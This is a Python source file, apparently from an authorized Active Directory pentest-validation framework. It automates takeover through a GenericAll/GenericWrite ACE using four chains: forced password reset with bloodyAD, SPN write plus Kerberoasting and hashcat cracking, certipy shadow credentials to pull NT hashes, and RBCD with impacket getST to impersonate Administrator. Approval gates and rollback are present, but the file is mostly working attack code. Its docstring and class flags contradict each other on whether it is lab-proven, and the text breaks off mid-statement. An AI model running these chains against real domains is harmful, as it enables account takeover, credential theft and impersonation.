"""GENERIC-ALL validation executor -- T3 (ACL / object-takeover edges).

GENERIC-ALL/GENERIC-WRITE is the one T3 technique that is itself a complete
object-takeover primitive: whatever a trustee can do with it is already
covered by WRITE-DACL/WRITE-OWNER/ADD-MEMBER/TARGETED-KERBEROAST/
FORCE-CHANGE-PASSWORD/SHADOW-CREDS/RBCD, so this executor does not invent a
NEW recipe -- it is ONE class with a ``pivot`` param selecting which of 4
already-proven shapes to exercise, given a confirmed GenericAll/GenericWrite
ACE over ``target``:

    impacket-dacledit -action read                       (shared step 0: confirm the ACE)
    pivot == "reset_password"  -> bloodyAD set password + nxc reauth (DESTRUCTIVE, no rollback)
    pivot == "spn_kerberoast"  -> write SPN -> roast -> gated crack -> reauth -> rollback clears SPN
    pivot == "shadow_creds"    -> certipy-ad shadow auto (reuses ShadowCredsExecutor's own markers)
    pivot == "rbcd"            -> addcomputer -> rbcd write -> getST S4U -> nxc -k (reuses RBCDExecutor's shape)

``destructive=True`` AND ``crack_dependent=True`` at the CLASS level,
**conservatively**: the chain engine builds its edge list from one instance
per technique BEFORE any ``pivot`` param is resolved, so it cannot know in
advance which pivot a composed run would pick (plan §4.3). Only the
``reset_password`` pivot's body actually calls ``ctx.destructive_confirmer``;
the other 3 pivots, run standalone, never hit that gate at all.

``verified_recipe=False`` (recipe-known, not lab-proven, like every T3
executor). Each pivot's own UNVERIFIED markers are flagged at the point they
are (re)used; the ``shadow_creds`` pivot imports its markers directly from
``shadow_creds.py`` (deliberate cross-module reuse, per plan §2.1, so a later
in-lab correction there updates this pivot automatically); the ``rbcd`` pivot
instead duplicates ``rbcd.py``'s own markers/rollback inline ("modest,
orchestration-glue duplication, not novel logic" -- the same §1.1 rationale
every other T3 file already applies).
"""
from __future__ import annotations
from .. import netresolve

import re
import secrets
from pathlib import Path
from typing import Any, Optional

from ..recommend import (ParamSpec, ParamValue, values, resolve_params,
                         delegation_computer, recommended_spn,
                         validate_sam_name, sam_name_warning)
from ..predicates import positive_absence
from .. import proof
from .. import states
from ._reveal_common import key_material, pkinit_hashes
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, ValidationPlan, StepRecord,
                   RunResult, redact_argv, ToolAttempt, first_successful,
                   Capability, CAP_NONE, CAP_NT_HASH, CAP_CONTROL, ControlGrant)
from .acl_common import dacledit_read_argv, confirm_ace, _RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE
from .shadow_creds import _RE_SHADOW_HASH, _RE_SHADOW_RESTORE
from .roast import DEFAULT_WORDLIST


# ---- reset_password / spn_kerberoast markers (same literals as
#      force_change_password.py/targeted_kerberoast.py -- modest duplication,
#      zero cross-module coupling, same rationale throughout T3) -------------
_RE_BLOODYAD_SET_PW_OK = re.compile(
    r"(successfully set|password (has been )?changed|updated)", re.I)
_RE_BLOODYAD_SET_OK = re.compile(
    r"(successfully (set|updated)|attribute.*(updated|set))", re.I)
_RE_KRB5TGS = re.compile(r"\$krb5tgs\$[^\s]+")
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)
_RE_ANCHOR = re.compile(r"(Response for object|\bsAMAccountName\b\s*[:=])", re.I)

# ---- rbcd pivot markers -- duplicated from rbcd.py inline, per plan §2.1 ----
_RE_GA_ADDCOMPUTER_OK = re.compile(r"Successfully added (machine|computer) account", re.I)
_RE_GA_RBCD_WRITE_OK = re.compile(r"Delegation rights (modified|updated) successfully", re.I)
_RE_GA_BLOODYAD_RBCD_OK = re.compile(
    r"can (now )?act on behalf|rbcd.*(written|added)|Successfully", re.I)
_RE_GA_RBCD_FLUSH_OK = re.compile(r"(Delegation rights flushed|rights (modified|updated) successfully)", re.I)
_RE_GA_RBCD_READ_OK = re.compile(r"allowed to act on behalf|Accounts allowed to act", re.I)
_RE_GA_ADDCOMPUTER_DEL_OK = re.compile(r"Successfully deleted (machine|computer) account", re.I)
_RE_GA_GETST_TICKET = re.compile(r"(Saving|Updating) ticket in\s+(\S+)", re.I)


def _tool_errored(res: RunResult) -> bool:
    return bool(res.error) or res.timed_out or res.returncode is None


def _account_read_ok(res: RunResult, text: str) -> bool:
    if _tool_errored(res) or not (text or "").strip():
        return False
    return bool(_RE_ANCHOR.search(text))


def _nxc_auth_flags(cfg) -> list[str]:
    return netresolve.nxc_auth_flags(cfg)


def _bloodyad_auth_argv(cfg, dc: str) -> list[str]:
    argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
    if cfg.nt_hash:
        argv += ["-H", cfg.nt_hash]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    argv += ["--host", dc]
    return argv


def _principal_short(name: str) -> str:
    name = (name or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name


def _short_name(host: str) -> str:
    """The computer sAMAccountName root for a host (short DNS label)."""
    return (host or "").split(".", 1)[0]


class GenericAllExecutor(ValidationExecutor):
    recovers_credentials = True
    technique = "GENERIC-ALL"
    technique_class = "acl"
    # Informational only -- the REAL, pivot-dependent kind is computed by
    # `plan()`/`execute()` (see `_PIVOT_TERMINAL`); this reflects the
    # recommended default pivot (`shadow_creds`).
    terminal_kind = "secret_recovered"
    mutating = True
    destructive = True        # conservative class-level flag -- see module docstring
    crack_dependent = True    # ditto (the spn_kerberoast pivot)
    verified_recipe = True        # lab-proven on GOAD 26NOV2026 (shadow_creds pivot, essos/jorah.mormont, scored proved+clean)
    pre = frozenset({states.S0_USER_CREDS, states.S_ACL_CONTROL})
    eff = frozenset({states.S_ACL_CRED, states.S_IMPERSONATION_TGT})
    recipe_ref = ("T3 GENERIC-ALL = dacledit read (confirm precondition GenericAll/"
                  "GenericWrite) ; pivot in {reset_password, spn_kerberoast, "
                  "shadow_creds, rbcd} -- each pivot reuses an already-proven T3/"
                  "T1b/FULL recipe shape (recipe-known, NOT lab-proven)")

    _PIVOT_TERMINAL = {"reset_password": "authn_success", "spn_kerberoast": "authn_success",
                       "shadow_creds": "secret_recovered", "rbcd": "rbcd_access"}

    def chain_pre(self, ctx, finding) -> frozenset:
        # Composed execution needs control of THIS object. S0 is deliberately
        # absent: knowing the target is not evidence that the operator controls it.
        return frozenset({states.control_for(self._params(ctx, finding)["target"].value)})

    def chain_eff(self, ctx, finding) -> frozenset:
        params = self._params(ctx, finding)
        if params["pivot"].value == "rbcd":
            return frozenset({states.S_IMPERSONATION_TGT})
        return frozenset({states.cred_for(params["target"].value)})

    def accepts_control(self, ctx, finding, cap) -> bool:
        target = self._params(ctx, finding)["target"].value
        grant = cap.value
        return (cap.channel == CAP_CONTROL and isinstance(grant, ControlGrant)
                and cap.state == states.control_for(target) and grant.object == target
                and grant.actor == ctx.config.username
                and grant.right in {"FullControl", "GenericAll", "GenericWrite"}
                and grant.lifetime in {"until teardown", "operator-seed"})

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        target = entity.get("target") or finding.host or ""
        base = ctx.config.principal_base
        return [
            ParamSpec(
                name="target", kind="target_host",
                description="The user/computer the confirmed GenericAll/GenericWrite "
                            "ACE is held over.",
                recommended=target,
                rationale="The target of the aranum ACL finding.",
                required=True,
            ),
            ParamSpec(
                name="pivot", kind="free",
                description="Which already-proven recipe to exercise with the "
                            "GenericAll/GenericWrite ACE: reset_password "
                            "(destructive, no rollback), spn_kerberoast (roast+crack, "
                            "rolls back), shadow_creds (NT hash via PKINIT, "
                            "self-restoring), or rbcd (S4U impersonation, rolls back).",
                recommended="shadow_creds",
                rationale="shadow_creds is the only pivot that is both "
                          "non-destructive and crack-free; override per engagement.",
                choices=["reset_password", "spn_kerberoast", "shadow_creds", "rbcd"],
            ),
            ParamSpec(
                name="new_computer", kind="computer_name",
                description="New computer account to create and control "
                            "(the `rbcd` pivot's 'delegate-from' principal). "
                            "Unused by every other pivot.",
                recommended=delegation_computer(base)[:20],   # bound to the 20-char sAMAccountName limit
                rationale="Derived from the operator's own principal, same "
                          "convention as RBCDExecutor.",
                validator=validate_sam_name, advisory=sam_name_warning,
            ),
            ParamSpec(
                name="impersonate", kind="escalation_target",
                description="Principal to impersonate via S4U (the `rbcd` pivot "
                            "only). Unused by every other pivot.",
                recommended="Administrator",
                rationale="High-value default; override per engagement.",
            ),
            ParamSpec(
                name="spn", kind="spn",
                description="The service principal name written on `target` before "
                            "roasting it (the `spn_kerberoast` pivot only). Unused "
                            "by every other pivot.",
                recommended=recommended_spn("http", target) if target else "http/<target>",
                rationale="An http/<target> SPN is a plausible, inert service class.",
            ),
            ParamSpec(
                name="wordlist", kind="free",
                description="Offline cracking wordlist for hashcat (the "
                            "`spn_kerberoast` pivot only). Unused by every other pivot.",
                recommended=DEFAULT_WORDLIST,
                rationale="Kali's rockyou (imported from roast.py); override to a "
                          "larger list or a ruleset path.",
                validator=lambda v: None if isinstance(v, str) and v.strip()
                else "must be a wordlist path",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        entity = finding.entity or {}
        target = params["target"].value or entity.get("target") or finding.host or ""
        pivot = params["pivot"].value
        domain = ctx.config.domain
        if pivot == "shadow_creds":
            # Mirrors ShadowCredsExecutor exactly.
            return {"domain": domain, "account": target}
        if pivot == "rbcd":
            # Mirrors RBCDExecutor exactly.
            return ctx.config.resolve_target_identity(target)
        return {"domain": domain, "principal": target}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        target, pivot = v["target"], v["pivot"]
        common = [f"impacket-dacledit -action read -target '{target}' -dc-ip {dc} <auth>  "
                 "(confirm precondition GenericAll/GenericWrite)"]
        if pivot == "reset_password":
            return common + [
                "*** DESTRUCTIVE: warn-press-yes confirmation required ***",
                f"bloodyAD ... --host {dc} set password '{target}' ***",
                f"nxc smb {dc} -u {target} -p ***   (= authn proof)",
                "ROLLBACK: NONE -- the original password cannot be recovered (irreversible)",
            ]
        if pivot == "spn_kerberoast":
            return common + [
                f"bloodyAD ... --host {dc} set object '{target}' servicePrincipalName "
                f"-v '{v['spn']}'",
                f"impacket-GetUserSPNs <auth> -dc-ip {dc} -request -request-user "
                f"'{target}' -> $krb5tgs$",
                f"hashcat -m 13100 <hashes> {v['wordlist']}  (offline, gated)",
                f"nxc smb {dc} -u {target} -p ***   (= authn proof)",
                "ROLLBACK: clear the written SPN + positive_absence readback",
            ]
        if pivot == "shadow_creds":
            return common + [
                f"certipy-ad shadow auto -account {target} -u <op>@{ctx.config.domain} "
                f"-p *** -dc-ip {dc}   (add KeyCredentialLink -> PKINIT -> NT hash -> "
                "auto-restore)",
            ]
        # rbcd
        return common + [
            f"impacket-addcomputer -computer-name '{v['new_computer']}$' "
            f"-computer-pass *** -dc-ip {dc} <auth>",
            f"impacket-rbcd -delegate-to '{_short_name(target)}$' -delegate-from "
            f"'{v['new_computer']}$' -action write -dc-ip {dc} <auth>",
            f"impacket-getST -spn cifs/{target} -impersonate {v['impersonate']} "
            f"-dc-ip {dc} '<domain>/{v['new_computer']}$:***'",
            f"nxc smb {target} -k --use-kcache   (KRB5CCNAME=<ticket>)",
            f"ROLLBACK: impacket-rbcd -action flush ; impacket-addcomputer -delete",
        ]

    # ---------------------------------------------------------------- plan()
    # Overridden (not just steps_preview): `terminal_kind` is pivot-dependent,
    # and the base ValidationExecutor.plan() reads the plain class attribute
    # with no params in scope at that point (plan §2.1).
    def plan(self, ctx: ExecutorContext, finding,
            overrides: Optional[dict[str, Any]] = None) -> ValidationPlan:
        params = self._params(ctx, finding, overrides)
        pivot = params["pivot"].value
        return ValidationPlan(
            technique=self.technique, technique_class=self.technique_class,
            target=self.target_identity(ctx, finding, params), mutating=self.mutating,
            terminal_kind=self._PIVOT_TERMINAL[pivot], params=params,
            steps_preview=self.steps_preview(ctx, finding, params),
            verified_recipe=self.verified_recipe, recipe_ref=self.recipe_ref,
            finding_summary=finding.summary(),
        )

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self, cfg) -> tuple[str, list[str]]:
        target = f"{cfg.domain}/{cfg.username or ''}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    def _certipy_auth_argv(self, cfg) -> list[str]:
        argv = ["-u", f"{cfg.username or ''}@{cfg.domain}"]
        if cfg.nt_hash:
            argv += ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            argv += ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        return argv

    def _bloodyad_rbcd_argv(self, cfg, dc: str, vsam: str, new: str) -> list[str]:
        """bloodyAD RBCD-write fallback -- duplicated from RBCDExecutor's own
        (UNVERIFIED) D2 fallback, per plan §2.1."""
        argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
        if cfg.nt_hash:
            argv += ["-H", cfg.nt_hash]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        argv += ["--host", dc, "add", "rbcd", f"{vsam}$", f"{new}$"]
        return argv

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        cfg = ctx.config
        v = values(params)
        target, pivot = v["target"], v["pivot"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        if ctx.composed and not self.accepts_control(ctx, finding, ctx.input_caps.get("control", Capability(""))):
            return self._artifact(steps, gate, mutation, None, False, ["control_not_established"])

        # 0) confirm the PRECONDITION ACE over the target -- shared by all pivots
        read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("generic_all_not_confirmed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if confirmed is None:
            errors.append("advisory:generic_all_unconfirmed_attempting_anyway")

        dispatch = {
            "reset_password": self._run_reset_password,
            "spn_kerberoast": self._run_spn_kerberoast,
            "shadow_creds": self._run_shadow_creds,
            "rbcd": self._run_rbcd,
        }
        artifact.update(dispatch[pivot](ctx, cfg, target, v, dc, out_dir, steps, errors, gate,
                                        mutation, record))
        return artifact

    def teardown(self, ctx, obligation) -> dict:
        pivot = obligation["pivot"]
        if pivot not in {"spn_kerberoast", "rbcd"}:
            return super().teardown(ctx, obligation)
        mutation = {"applied": True,
                    "rollback": {"performed": False, "method": None, "verified": False}}
        rollback = self._rollback_spn if pivot == "spn_kerberoast" else self._rollback_rbcd
        rollback(ctx, ctx.config, *obligation["args"], mutation, [], [],
                 lambda *args, **kwargs: None)
        return mutation["rollback"]

    # ---------------------------------------------------------------- pivot: reset_password
    def _run_reset_password(self, ctx, cfg, target, v, dc, out_dir, steps, errors,
                            gate, mutation, record) -> dict:
        approved = ctx.destructive_confirmer.confirm("generic_all_reset_password",
                                                      {"target": target})
        if not approved:
            gate["classifier"] = "denied"
            gate["op"] = "generic_all_reset_password"
            errors.append("gate_denied:generic_all_reset_password")
            return self._artifact(steps, gate, mutation, None, False, errors)
        gate["classifier"] = "approved"
        gate["op"] = "generic_all_reset_password"

        new_pw = secrets.token_urlsafe(18)                 # secret, never stored
        mutation["applied"] = True
        errors.append(f"advisory:irreversible:original_password_not_recoverable:"
                      f"{target}@{cfg.domain}")
        set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "password", target, new_pw]
        ctx._pending_teardown = {"pivot": "reset_password", "target": target}
        res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        set_out = (res.stdout or "") + (res.stderr or "")
        set_ok = bool(_RE_BLOODYAD_SET_PW_OK.search(set_out))
        if set_ok:
            ctx._pending_reveal_artifact["_reveal"].append(
                SecretReveal(self.technique, "password", target, new_pw))
        # positional secret -- redact_argv's flag-keyed masking can't catch it
        # (see force_change_password.py's identical fix).
        record("set_password", set_argv[:-1] + ["***"], res, set_ok,
              note="password reset" if set_ok else "password reset failed")
        if not set_ok:
            errors.append("password_set_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)

        nxc_argv = ["nxc", "smb", dc, "-u", target, "-p", new_pw]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s)
        out = res.stdout or ""
        reauth_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
        record("reauth", nxc_argv, res, reauth_ok,
              note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if reauth_ok else "")
        if not reauth_ok:
            errors.append("reauth_failed")

        terminal_fact = proof.build_terminal_fact(
            "authn_success", ok=reauth_ok, impersonated=target,
            predicate=(f"reset {target}'s password via a confirmed GenericAll/"
                      "GenericWrite ACE and re-authenticated as them"),
            proof_token=proof.proof_token("GENERIC-ALL", "reset_password", cfg.domain,
                                          target, "authn_success" if reauth_ok
                                          else "authn_failed"),
            extra={"target": target},
        )
        # Rollback is deliberately NEVER performed for this pivot (by design,
        # mirrors FORCE-CHANGE-PASSWORD exactly) -- never required for `complete`.
        complete = bool(reauth_ok)
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- pivot: spn_kerberoast
    def _run_spn_kerberoast(self, ctx, cfg, target, v, dc, out_dir, steps, errors,
                            gate, mutation, record) -> dict:
        spn, wordlist = v["spn"], v["wordlist"]
        target_short = _principal_short(target)

        def finish(terminal_fact, ok) -> dict:
            complete = bool(ok)
            if mutation["applied"]:
                self._rollback_spn(ctx, cfg, target, spn, mutation, steps, errors, record)
                complete = bool(ok and mutation["rollback"]["performed"])
            return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

        set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", target,
                                                   "servicePrincipalName", "-v", spn]
        ctx._pending_teardown = {"pivot": "spn_kerberoast", "args": (target, spn)}
        res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        set_out = (res.stdout or "") + (res.stderr or "")
        set_ok = bool(_RE_BLOODYAD_SET_OK.search(set_out))
        record("write_spn", set_argv, res, set_ok,
              note="SPN written" if set_ok else "SPN write failed")
        if not set_ok:
            errors.append("spn_write_failed")
            return finish(None, False)
        mutation["applied"] = True

        op_target, op_extra = self._op_auth_target(cfg)
        roast_argv = ["impacket-GetUserSPNs", op_target, "-dc-ip", dc, "-request",
                     "-request-user", target, *op_extra]
        res = ctx.runner.run(roast_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        hashes = _RE_KRB5TGS.findall(res.stdout or "")
        ctx._pending_reveal_artifact["_reveal"].extend(
            SecretReveal(self.technique, "crackable_hash", target, blob) for blob in hashes)
        roast_ok = bool(hashes)
        record("roast", roast_argv, res, roast_ok,
              note=(f"{len(hashes)} hash(es)" if roast_ok else "no hash"))
        if not roast_ok:
            errors.append("roast_no_hash")
            return finish(None, False)
        hashfile = out_dir / f"generic_all_{target_short}.hash"
        hashfile.write_text("\n".join(hashes) + "\n", encoding="utf-8")

        verdict = ctx.authorizer.authorize("offline_crack",
                                           {"technique": self.technique, "target": target})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "offline_crack"
            errors.append("gate_denied:offline_crack")
            return finish(None, False)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "offline_crack"

        potfile = out_dir / f"generic_all_{target_short}.pot"
        crack_argv = ["hashcat", "-m", "13100", str(hashfile), wordlist,
                     "--potfile-path", str(potfile), "--quiet"]
        res = ctx.runner.run(crack_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        show_argv = ["hashcat", "-m", "13100", str(hashfile), "--show",
                    "--potfile-path", str(potfile), "--outfile-format", "2", "--quiet"]
        res_show = ctx.runner.run(show_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        plaintext = self._first_plaintext(res_show.stdout or "")
        if plaintext:
            ctx._pending_reveal_artifact["_reveal"].append(
                SecretReveal(self.technique, "password", target, plaintext))
        crack_ok = bool(plaintext)
        record("crack", crack_argv, res, crack_ok,
              note="cracked" if crack_ok else "not cracked")
        if not crack_ok:
            errors.append("crack_failed")
            return finish(None, False)

        nxc_argv = ["nxc", "smb", dc, "-u", target, "-p", plaintext]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s)
        out = res.stdout or ""
        reauth_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
        record("reauth", nxc_argv, res, reauth_ok,
              note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if reauth_ok else "")
        if not reauth_ok:
            errors.append("reauth_failed")

        terminal_fact = proof.build_terminal_fact(
            "authn_success", ok=reauth_ok, impersonated=target,
            predicate=(f"GenericAll/GenericWrite-wrote an SPN on {target}, "
                      "Kerberoasted + cracked it, and re-authenticated as them"),
            proof_token=proof.proof_token("GENERIC-ALL", "spn_kerberoast", cfg.domain,
                                          target, "authn_success" if reauth_ok
                                          else "authn_failed"),
            extra={"target": target, "spn": spn},
        )
        return finish(terminal_fact, reauth_ok)

    def _rollback_spn(self, ctx, cfg, target, spn, mutation, steps, errors, record) -> None:
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"target": target}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = ("bloodyAD clear servicePrincipalName + "
                                          "positive_absence readback")

        clear_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", target,
                                                     "servicePrincipalName", "-v", ""]
        res = ctx.runner.run(clear_argv, timeout=cfg.tool_timeout_s)
        record("rollback_clear_spn", clear_argv, res, not _tool_errored(res))

        target_short = _principal_short(target)
        query_argv = ["nxc", "ldap", dc, *_nxc_auth_flags(cfg),
                     "--query", f"(sAMAccountName={target_short})", "servicePrincipalName"]
        res = ctx.runner.run(query_argv, timeout=cfg.tool_timeout_s)
        query_text = (res.stdout or "") + (res.stderr or "")
        bind_ok = _account_read_ok(res, query_text)
        cleared = positive_absence(bind_ok, query_text, spn)
        record("rollback_verify_absent", query_argv, res, cleared,
              note="SPN cleared (confirmed)" if cleared else "SPN removal not confirmed")

        mutation["rollback"]["verified"] = cleared
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    # ---------------------------------------------------------------- pivot: shadow_creds
    def _run_shadow_creds(self, ctx, cfg, target, v, dc, out_dir, steps, errors,
                          gate, mutation, record) -> dict:
        verdict = ctx.authorizer.authorize("shadow_write", {"account": target})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "shadow_write"
            errors.append("gate_denied:shadow_write")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "shadow_write"

        shadow_argv = ["certipy-ad", "shadow", "auto", "-account", target,
                       *self._certipy_auth_argv(cfg), "-dc-ip", dc]
        ctx._pending_teardown = {"pivot": "shadow_creds", "target": target}
        res = ctx.runner.run(shadow_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        out = (res.stdout or "") + (res.stderr or "")
        ctx._pending_reveal_artifact["_reveal"].extend(pkinit_hashes(self.technique, target, out))
        hash_ok = bool(_RE_SHADOW_HASH.search(out))
        restore_ok = bool(_RE_SHADOW_RESTORE.search(out))
        record("shadow_auto", shadow_argv, res, hash_ok,
              note="hash recovered" if hash_ok else "no hash recovered")

        mutation["applied"] = True
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "certipy shadow auto self-restore"
        mutation["rollback"]["verified"] = restore_ok
        if not restore_ok:
            errors.append("rollback_unverified")

        if not hash_ok:
            errors.append("shadow_no_hash")
            return self._artifact(steps, gate, mutation, None, False, errors)

        terminal_fact = proof.build_terminal_fact(
            "secret_recovered", ok=hash_ok,
            predicate=(f"recovered the NT hash of {target} in {cfg.domain} via shadow "
                      "credentials (msDS-KeyCredentialLink + PKINIT), reached through "
                      "a confirmed GenericAll/GenericWrite ACE"),
            proof_token=proof.proof_token("GENERIC-ALL", "shadow_creds", cfg.domain,
                                          target, "hash_recovered"),
            extra={"target": target},
        )
        complete = hash_ok
        artifact = self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
        recovered = re.search(
            r"(?:Got hash for|NT hash for)\s+['\"]?" + re.escape(target)
            + r"['\"]?:\s*(?:[0-9a-f]{32}:)?([0-9a-f]{32})(?![0-9a-f])", out, re.I)
        if recovered:
            artifact["_recovered_hash"] = recovered.group(1)
        return artifact

    # ---------------------------------------------------------------- pivot: rbcd
    def _run_rbcd(self, ctx, cfg, target, v, dc, out_dir, steps, errors, gate,
                 mutation, record) -> dict:
        new = v["new_computer"]
        impersonate = v["impersonate"]
        spn = recommended_spn("cifs", target)
        vsam = _short_name(target)
        new_pass = secrets.token_urlsafe(18)              # secret, never stored
        op_target, op_extra = self._op_auth_target(cfg)
        new_target = f"{cfg.domain}/{new}$:{new_pass}"

        def gated(op: str, detail: dict) -> bool:
            verdict = ctx.authorizer.authorize(op, detail)
            if verdict == "denied":
                gate["classifier"] = "denied"
                gate["op"] = op
                errors.append(f"gate_denied:{op}")
                return False
            if verdict == "approved" and gate["classifier"] == "not_required":
                gate["classifier"] = "approved"
                gate["op"] = op
            return True

        # 1) create the controlled computer (mutating, gated) ----------------
        if not gated("addcomputer", {"computer": f"{new}$"}):
            return self._artifact(steps, gate, mutation, None, False, errors)
        add_argv = ["impacket-addcomputer", "-computer-name", f"{new}$",
                    "-computer-pass", new_pass, "-dc-ip", dc, *op_extra, op_target]
        ctx._pending_teardown = {"pivot": "rbcd", "args": (vsam, new, op_target, op_extra)}
        res = ctx.runner.run(add_argv, timeout=cfg.tool_timeout_s)
        add_ok = bool(_RE_GA_ADDCOMPUTER_OK.search(res.stdout or ""))
        record("addcomputer", add_argv, res, add_ok)
        if not add_ok:
            errors.append("addcomputer_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True

        # 2) write RBCD on the target (mutating, gated; D2 light fallback) ---
        if not gated("rbcd_write", {"delegate_to": f"{vsam}$", "delegate_from": f"{new}$"}):
            self._rollback_rbcd(ctx, cfg, vsam, new, op_target, op_extra, mutation,
                               steps, errors, record)
            return self._artifact(steps, gate, mutation, None, False, errors)
        rbcd_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$",
                     "-delegate-from", f"{new}$", "-action", "write",
                     "-dc-ip", dc, *op_extra, op_target]
        attempts = [
            ToolAttempt("impacket-rbcd", rbcd_argv,
                        success=lambda r: bool(_RE_GA_RBCD_WRITE_OK.search(r.stdout or ""))),
            ToolAttempt("bloodyAD", self._bloodyad_rbcd_argv(cfg, dc, vsam, new),
                        success=lambda r: bool(
                            _RE_GA_BLOODYAD_RBCD_OK.search((r.stdout or "") + (r.stderr or "")))),
        ]
        att, res, rbcd_ok = first_successful(attempts=attempts, runner=ctx.runner,
                                             timeout=cfg.tool_timeout_s)
        record("rbcd_write", att.argv, res, rbcd_ok, note=f"via {att.tool}")
        if not rbcd_ok:
            errors.append("rbcd_write_failed")
            self._rollback_rbcd(ctx, cfg, vsam, new, op_target, op_extra, mutation,
                               steps, errors, record)
            return self._artifact(steps, gate, mutation, None, False, errors)

        # 3) S4U getST as the new computer -> impersonation ticket -----------
        getst_argv = ["impacket-getST", "-spn", spn, "-impersonate", impersonate,
                      "-dc-ip", dc, new_target]
        res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": None}, cwd=str(out_dir))
        ticket = self._parse_ticket(res.stdout or "", out_dir)
        ctx._pending_reveal_artifact["_reveal"].extend(
            key_material(self.technique, "ccache", impersonate, ticket))
        getst_ok = ticket is not None
        record("getST", getst_argv, res, getst_ok,
                note="ticket saved" if getst_ok else "no ticket")

        # 4) ticket-backed access = the terminal proof ----------------------
        terminal_fact: Optional[dict] = None
        if getst_ok:
            nxc_argv = ["nxc", "smb", target, "-k", "--use-kcache",
                        *netresolve.nxc_kerberos_flags(cfg)]
            res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s,
                                 env={"KRB5CCNAME": ticket}, cwd=str(out_dir))
            out = res.stdout or ""
            nxc_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
            record("nxc_access", nxc_argv, res, nxc_ok,
                   note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if nxc_ok else "")
            if not nxc_ok:
                diag = netresolve.classify_resolution_failure(
                    cfg, target, out + "\n" + (res.stderr or ""))
                if diag:
                    errors.append(diag)
            terminal_fact = proof.build_terminal_fact(
                "rbcd_access", ok=nxc_ok, impersonated=impersonate,
                predicate=(f"impersonated {impersonate} to {spn} via RBCD on "
